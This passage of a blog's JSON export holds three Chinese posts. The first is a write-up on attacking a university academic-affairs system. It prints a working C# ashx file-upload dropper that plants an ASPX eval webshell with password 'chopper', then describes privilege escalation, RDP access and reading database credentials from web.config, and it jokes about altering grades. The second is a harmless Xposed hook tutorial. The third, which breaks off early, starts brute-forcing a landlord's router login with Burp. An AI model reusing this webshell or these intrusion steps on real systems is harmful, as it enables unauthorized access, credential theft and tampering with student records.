在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。\n\n![](/images/pasted-61.PNG)\n\n>在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码\n\n>![](/images/pasted-100.jpg)\n\n\n### 总结\n> 这个是什么教务系统就不多说，用过的一看就知道。\n> 有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。\n> 后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。\n>再次提醒：\n> **文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**","slug":"diary-2017-0314-02","published":1,"updated":"2017-05-22T16:25:39.696Z","photos":[],"link":"","_id":"cjvhjxaaq000diny2hd30kf7g","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。<a id=\"more\"></a></p>\n</blockquote>\n<h3 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h3><blockquote>\n<p>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传</p>\n</blockquote>\n<p><img src=\"/images/pasted-53.PNG\" alt></p>\n<p><img src=\"/images/pasted-53.5.PNG\" alt></p>\n<blockquote>\n<p>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话</p>\n</blockquote>\n<p>poc:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; </span><br><span class=\"line\">using System; </span><br><span class=\"line\">using System.Web; </span><br><span class=\"line\">using System.IO; </span><br><span class=\"line\">public class Handler : IHttpHandler &#123; </span><br><span class=\"line\">    public void ProcessRequest (HttpContext context) &#123; </span><br><span class=\"line\">        context.Response.ContentType = &quot;text/plain&quot;; </span><br><span class=\"line\">        string show=&quot;&lt;%@ Page Language=\\&quot;Jscript\\&quot;%&gt;&lt;%eval(Request.Item[\\&quot;chopper\\&quot;],\\&quot;unsafe\\&quot;);%&gt;&quot;; </span><br><span class=\"line\">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); </span><br><span class=\"line\">        file1.Write(show); </span><br><span class=\"line\">        file1.Flush(); </span><br><span class=\"line\">        file1.Close(); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    public bool IsReusable &#123; </span><br><span class=\"line\">        get &#123; </span><br><span class=\"line\">            return false; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>会上传在wbwj目录下</p>\n</blockquote>\n<blockquote>\n<p>访问http://<strong><em>.</em></strong>.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper</p>\n</blockquote>\n<blockquote>\n<p>一句话地址，http://<strong><em>.</em></strong>.com/wbwj/root.aspx  连接之</p>\n</blockquote>\n<p><img src=\"/images/pasted-54.PNG\" alt></p>\n<blockquote>\n<p>看下权限,还是挺大的，</p>\n</blockquote>\n<p><img src=\"/images/pasted-55.PNG\" alt></p>\n<p><img src=\"/images/pasted-56.PNG\" alt></p>\n<p><img src=\"/images/pasted-57.PNG\" alt></p>\n<blockquote>\n<p>直接上传神器提权之。</p>\n</blockquote>\n<p><img src=\"/images/pasted-58.PNG\" alt></p>\n<blockquote>\n<p>3389端口没有改，直接连接。</p>\n</blockquote>\n<p><img src=\"/images/pasted-59.PNG\" alt></p>\n<p><img src=\"/images/pasted-60.PNG\" alt></p>\n<blockquote>\n<p>在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。</p>\n</blockquote>\n<p><img src=\"/images/pasted-61.PNG\" alt></p>\n<blockquote>\n<p>在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-100.jpg\" alt></p>\n</blockquote>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><blockquote>\n<p>这个是什么教务系统就不多说，用过的一看就知道。<br>有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。<br>后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。","more":"</p>\n</blockquote>\n<h3 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h3><blockquote>\n<p>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传</p>\n</blockquote>\n<p><img src=\"/images/pasted-53.PNG\" alt></p>\n<p><img src=\"/images/pasted-53.5.PNG\" alt></p>\n<blockquote>\n<p>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话</p>\n</blockquote>\n<p>poc:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; </span><br><span class=\"line\">using System; </span><br><span class=\"line\">using System.Web; </span><br><span class=\"line\">using System.IO; </span><br><span class=\"line\">public class Handler : IHttpHandler &#123; </span><br><span class=\"line\">    public void ProcessRequest (HttpContext context) &#123; </span><br><span class=\"line\">        context.Response.ContentType = &quot;text/plain&quot;; </span><br><span class=\"line\">        string show=&quot;&lt;%@ Page Language=\\&quot;Jscript\\&quot;%&gt;&lt;%eval(Request.Item[\\&quot;chopper\\&quot;],\\&quot;unsafe\\&quot;);%&gt;&quot;; </span><br><span class=\"line\">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); </span><br><span class=\"line\">        file1.Write(show); </span><br><span class=\"line\">        file1.Flush(); </span><br><span class=\"line\">        file1.Close(); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    public bool IsReusable &#123; </span><br><span class=\"line\">        get &#123; </span><br><span class=\"line\">            return false; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>会上传在wbwj目录下</p>\n</blockquote>\n<blockquote>\n<p>访问http://<strong><em>.</em></strong>.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper</p>\n</blockquote>\n<blockquote>\n<p>一句话地址，http://<strong><em>.</em></strong>.com/wbwj/root.aspx  连接之</p>\n</blockquote>\n<p><img src=\"/images/pasted-54.PNG\" alt></p>\n<blockquote>\n<p>看下权限,还是挺大的，</p>\n</blockquote>\n<p><img src=\"/images/pasted-55.PNG\" alt></p>\n<p><img src=\"/images/pasted-56.PNG\" alt></p>\n<p><img src=\"/images/pasted-57.PNG\" alt></p>\n<blockquote>\n<p>直接上传神器提权之。</p>\n</blockquote>\n<p><img src=\"/images/pasted-58.PNG\" alt></p>\n<blockquote>\n<p>3389端口没有改，直接连接。</p>\n</blockquote>\n<p><img src=\"/images/pasted-59.PNG\" alt></p>\n<p><img src=\"/images/pasted-60.PNG\" alt></p>\n<blockquote>\n<p>在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。</p>\n</blockquote>\n<p><img src=\"/images/pasted-61.PNG\" alt></p>\n<blockquote>\n<p>在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-100.jpg\" alt></p>\n</blockquote>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><blockquote>\n<p>这个是什么教务系统就不多说，用过的一看就知道。<br>有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。<br>后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>\n</blockquote>"},{"layout":"post","title":"xposed环境搭建","date":"2017-03-25T10:55:37.000Z","comments":1,"_content":"### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。\n\n### 正文<!--more-->\n> 安卓环境就不多说了。\n> ##### 1 创建一个安卓工程项目\n> 初识状态\n\n> ![](/images/pasted-48.jpg)\n\n> ##### 2 导入xposed的jar包\n> 下载地址：\n> * https://bintray.com/rovo89/de.robv.android.xposed/api\n> 下载里面的`api-82-sources.jar`和`api-82.jar`\n> 导入到项目的lib目录下\n\n> ##### 3 修改AndroidManifest.xml\n> 在application节点中加入代码\n>\n```xml\n       <meta-data\n            android:name=\"xposedmodule\"\n            android:value=\"true\" />\n        <meta-data\n            android:name=\"xposeddescription\"\n            android:value=\"Hook log test\" />\n        <meta-data\n            android:name=\"xposedminversion\"\n            android:value=\"53\" />\n```\n\n> ##### 4 修改build.gradle\n>`provided` 方式导入jar包\n```gradle\ndependencies {\n    compile 'com.android.support:appcompat-v7:25.2.0'\n    testCompile 'junit:junit:4.12'\n    provided 'de.robv.android.xposed:api:82'\n    provided 'de.robv.android.xposed:api:82:sources'\n}\n```\n><font color=\"#ff0000\" fontSize=\"28sp\">注意,注意,注意,注意,注意,注意</font>\n这里默认有个 `compile fileTree(dir: 'libs', include: ['*.jar'])`  一定要删掉。\n\n> ##### 5 创建一个类\n> 创建一个`Tutorial`类，继承`IXposedHookLoadPackage`\n> \n```java\npublic class Tutorial implements IXposedHookLoadPackage {\n    public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable {\n        XposedBridge.log(\"正在加载中.....\" + lpparam.packageName);\n    }\n}\n```\n\n> ##### 6 创建入口文件。\n> 创建一个`assets`文件，并且在里面创建一个`xposed_init`文件。\n> `xposed_init`里面内容为`Tutorial`的完全路径\n> `hk.myapplication03.Tutorial`  //完整类名:包名+类名\n\n>Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。\n>查看一下log日志。\n\n> ![](/images/pasted-49.jpg)\n\n\n>OK了， 环境搭建完成并且成功的实现了一个简单的HOOK","source":"_posts/diary-2017-0325-01.md","raw":"---\nlayout: post\ntitle: xposed环境搭建\ndate: 2017-03-25 18:55:37\ncomments: true\ntags:\n\t- xposed\n---\n### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。\n\n### 正文<!--more-->\n> 安卓环境就不多说了。\n> ##### 1 创建一个安卓工程项目\n> 初识状态\n\n> ![](/images/pasted-48.jpg)\n\n> ##### 2 导入xposed的jar包\n> 下载地址：\n> * https://bintray.com/rovo89/de.robv.android.xposed/api\n> 下载里面的`api-82-sources.jar`和`api-82.jar`\n> 导入到项目的lib目录下\n\n> ##### 3 修改AndroidManifest.xml\n> 在application节点中加入代码\n>\n```xml\n       <meta-data\n            android:name=\"xposedmodule\"\n            android:value=\"true\" />\n        <meta-data\n            android:name=\"xposeddescription\"\n            android:value=\"Hook log test\" />\n        <meta-data\n            android:name=\"xposedminversion\"\n            android:value=\"53\" />\n```\n\n> ##### 4 修改build.gradle\n>`provided` 方式导入jar包\n```gradle\ndependencies {\n    compile 'com.android.support:appcompat-v7:25.2.0'\n    testCompile 'junit:junit:4.12'\n    provided 'de.robv.android.xposed:api:82'\n    provided 'de.robv.android.xposed:api:82:sources'\n}\n```\n><font color=\"#ff0000\" fontSize=\"28sp\">注意,注意,注意,注意,注意,注意</font>\n这里默认有个 `compile fileTree(dir: 'libs', include: ['*.jar'])`  一定要删掉。\n\n> ##### 5 创建一个类\n> 创建一个`Tutorial`类，继承`IXposedHookLoadPackage`\n> \n```java\npublic class Tutorial implements IXposedHookLoadPackage {\n    public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable {\n        XposedBridge.log(\"正在加载中.....\" + lpparam.packageName);\n    }\n}\n```\n\n> ##### 6 创建入口文件。\n> 创建一个`assets`文件，并且在里面创建一个`xposed_init`文件。\n> `xposed_init`里面内容为`Tutorial`的完全路径\n> `hk.myapplication03.Tutorial`  //完整类名:包名+类名\n\n>Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。\n>查看一下log日志。\n\n> ![](/images/pasted-49.jpg)\n\n\n>OK了， 环境搭建完成并且成功的实现了一个简单的HOOK","slug":"diary-2017-0325-01","published":1,"updated":"2017-03-28T14:09:06.266Z","photos":[],"link":"","_id":"cjvhjxaaq000einy29cxqh6xp","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。</p>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文<a id=\"more\"></a></h3><blockquote>\n<p>安卓环境就不多说了。</p>\n<h5 id=\"1-创建一个安卓工程项目\"><a href=\"#1-创建一个安卓工程项目\" class=\"headerlink\" title=\"1 创建一个安卓工程项目\"></a>1 创建一个安卓工程项目</h5><p>初识状态</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-48.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<h5 id=\"2-导入xposed的jar包\"><a href=\"#2-导入xposed的jar包\" class=\"headerlink\" title=\"2 导入xposed的jar包\"></a>2 导入xposed的jar包</h5><p>下载地址：</p>\n<ul>\n<li><a href=\"https://bintray.com/rovo89/de.robv.android.xposed/api\" target=\"_blank\" rel=\"noopener\">https://bintray.com/rovo89/de.robv.android.xposed/api</a><br>下载里面的<code>api-82-sources.jar</code>和<code>api-82.jar</code><br>导入到项目的lib目录下</li>\n</ul>\n</blockquote>\n<blockquote>\n<h5 id=\"3-修改AndroidManifest-xml\"><a href=\"#3-修改AndroidManifest-xml\" class=\"headerlink\" title=\"3 修改AndroidManifest.xml\"></a>3 修改AndroidManifest.xml</h5><p>在application节点中加入代码</p>\n</blockquote>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">\"xposedmodule\"</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:value</span>=<span class=\"string\">\"true\"</span> /&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">\"xposeddescription\"</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:value</span>=<span class=\"string\">\"Hook log test\"</span> /&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">\"xposedminversion\"</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:value</span>=<span class=\"string\">\"53\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<h5 id=\"4-修改build-gradle\"><a href=\"#4-修改build-gradle\" class=\"headerlink\" title=\"4 修改build.gradle\"></a>4 修改build.gradle</h5><p><code>provided</code> 方式导入jar包<br><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">dependencies</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">compile</span> <span class=\"string\">'com.android.support:appcompat-v7:25.2.0'</span></span><br><span class=\"line\">    testCompile <span class=\"string\">'junit:junit:4.12'</span></span><br><span class=\"line\">    provided <span class=\"string\">'de.robv.android.xposed:api:82'</span></span><br><span class=\"line\">    provided <span class=\"string\">'de.robv.android.xposed:api:82:sources'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p><font color=\"#ff0000\" fontsize=\"28sp\">注意,注意,注意,注意,注意,注意</font><br>这里默认有个 <code>compile fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;])</code>  一定要删掉。</p>\n</blockquote>\n<blockquote>\n<h5 id=\"5-创建一个类\"><a href=\"#5-创建一个类\" class=\"headerlink\" title=\"5 创建一个类\"></a>5 创建一个类</h5><p>创建一个<code>Tutorial</code>类，继承<code>IXposedHookLoadPackage</code></p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tutorial</span> <span class=\"keyword\">implements</span> <span class=\"title\">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">handleLoadPackage</span><span class=\"params\">(<span class=\"keyword\">final</span> LoadPackageParam lpparam)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        XposedBridge.log(<span class=\"string\">\"正在加载中.....\"</span> + lpparam.packageName);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<h5 id=\"6-创建入口文件。\"><a href=\"#6-创建入口文件。\" class=\"headerlink\" title=\"6 创建入口文件。\"></a>6 创建入口文件。</h5><p>创建一个<code>assets</code>文件，并且在里面创建一个<code>xposed_init</code>文件。<br><code>xposed_init</code>里面内容为<code>Tutorial</code>的完全路径<br><code>hk.myapplication03.Tutorial</code>  //完整类名:包名+类名</p>\n</blockquote>\n<blockquote>\n<p>Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。<br>查看一下log日志。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-49.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>OK了， 环境搭建完成并且成功的实现了一个简单的HOOK</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。</p>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文","more":"</h3><blockquote>\n<p>安卓环境就不多说了。</p>\n<h5 id=\"1-创建一个安卓工程项目\"><a href=\"#1-创建一个安卓工程项目\" class=\"headerlink\" title=\"1 创建一个安卓工程项目\"></a>1 创建一个安卓工程项目</h5><p>初识状态</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-48.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<h5 id=\"2-导入xposed的jar包\"><a href=\"#2-导入xposed的jar包\" class=\"headerlink\" title=\"2 导入xposed的jar包\"></a>2 导入xposed的jar包</h5><p>下载地址：</p>\n<ul>\n<li><a href=\"https://bintray.com/rovo89/de.robv.android.xposed/api\" target=\"_blank\" rel=\"noopener\">https://bintray.com/rovo89/de.robv.android.xposed/api</a><br>下载里面的<code>api-82-sources.jar</code>和<code>api-82.jar</code><br>导入到项目的lib目录下</li>\n</ul>\n</blockquote>\n<blockquote>\n<h5 id=\"3-修改AndroidManifest-xml\"><a href=\"#3-修改AndroidManifest-xml\" class=\"headerlink\" title=\"3 修改AndroidManifest.xml\"></a>3 修改AndroidManifest.xml</h5><p>在application节点中加入代码</p>\n</blockquote>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">\"xposedmodule\"</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:value</span>=<span class=\"string\">\"true\"</span> /&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">\"xposeddescription\"</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:value</span>=<span class=\"string\">\"Hook log test\"</span> /&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:name</span>=<span class=\"string\">\"xposedminversion\"</span></span></span><br><span class=\"line\"><span class=\"tag\">     <span class=\"attr\">android:value</span>=<span class=\"string\">\"53\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<h5 id=\"4-修改build-gradle\"><a href=\"#4-修改build-gradle\" class=\"headerlink\" title=\"4 修改build.gradle\"></a>4 修改build.gradle</h5><p><code>provided</code> 方式导入jar包<br><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">dependencies</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">compile</span> <span class=\"string\">'com.android.support:appcompat-v7:25.2.0'</span></span><br><span class=\"line\">    testCompile <span class=\"string\">'junit:junit:4.12'</span></span><br><span class=\"line\">    provided <span class=\"string\">'de.robv.android.xposed:api:82'</span></span><br><span class=\"line\">    provided <span class=\"string\">'de.robv.android.xposed:api:82:sources'</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p><font color=\"#ff0000\" fontsize=\"28sp\">注意,注意,注意,注意,注意,注意</font><br>这里默认有个 <code>compile fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;])</code>  一定要删掉。</p>\n</blockquote>\n<blockquote>\n<h5 id=\"5-创建一个类\"><a href=\"#5-创建一个类\" class=\"headerlink\" title=\"5 创建一个类\"></a>5 创建一个类</h5><p>创建一个<code>Tutorial</code>类，继承<code>IXposedHookLoadPackage</code></p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tutorial</span> <span class=\"keyword\">implements</span> <span class=\"title\">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">handleLoadPackage</span><span class=\"params\">(<span class=\"keyword\">final</span> LoadPackageParam lpparam)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        XposedBridge.log(<span class=\"string\">\"正在加载中.....\"</span> + lpparam.packageName);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<h5 id=\"6-创建入口文件。\"><a href=\"#6-创建入口文件。\" class=\"headerlink\" title=\"6 创建入口文件。\"></a>6 创建入口文件。</h5><p>创建一个<code>assets</code>文件，并且在里面创建一个<code>xposed_init</code>文件。<br><code>xposed_init</code>里面内容为<code>Tutorial</code>的完全路径<br><code>hk.myapplication03.Tutorial</code>  //完整类名:包名+类名</p>\n</blockquote>\n<blockquote>\n<p>Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。<br>查看一下log日志。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-49.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>OK了， 环境搭建完成并且成功的实现了一个简单的HOOK</p>\n</blockquote>"},{"layout":"post","title":"burp爆破http Basic认证","date":"2017-04-04T11:38:29.000Z","comments":1,"_content":"\n### 前言\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看房东的路由器，来试试使用burp爆破一波,对于如何配置burp就不多说了。\n<br/><!--more-->\n> ![](/images/pasted-62.PNG)\n<br/>\n>不用验证码，很好。\n\n>然后我们来登录看看发的哪些请求\n<br/>\n> ![](/images/pasted-57.jpg)\n\n<br/>\n>看样子密码经过base64加密了\n<br/>\n> ![](/images/pasted-58.jpg)\n\n>可以看到帐号默认admin，然后后面就是我们输入的密码\n\n>于是我输入另一个密码，来看一下编码中密码是从哪儿开始的\n<br/>\n> ![](/images/pasted-59.jpg)\n<br/>\n>知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload\n\n>首先load进字典文件\n<br/>\n> 